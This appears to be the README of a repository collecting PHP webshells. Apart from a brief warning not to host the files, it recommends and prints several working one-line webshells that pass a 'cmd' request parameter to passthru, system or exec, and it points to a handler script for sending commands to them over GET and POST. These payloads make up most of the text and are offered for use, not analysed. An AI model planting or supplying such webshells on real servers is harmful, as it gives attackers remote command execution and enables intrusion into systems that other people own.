php-webshells
=============

Common php webshells. Do not host the file(s) in your server!

++++++++++++++++++++++++++

Though I recommend one-liners like 

<?php echo passthru($_GET['cmd']); ?>

(Not a full fledged webshell, but works fine)

=================================================================

You can try WebHandler for one-liners.

WebHandler.py works for POST and GET requests:

    <?php system($_GET['cmd']); ?>
    <?php passthru($_REQUEST['cmd']); ?>
    <?php echo exec($_POST['cmd']); ?>


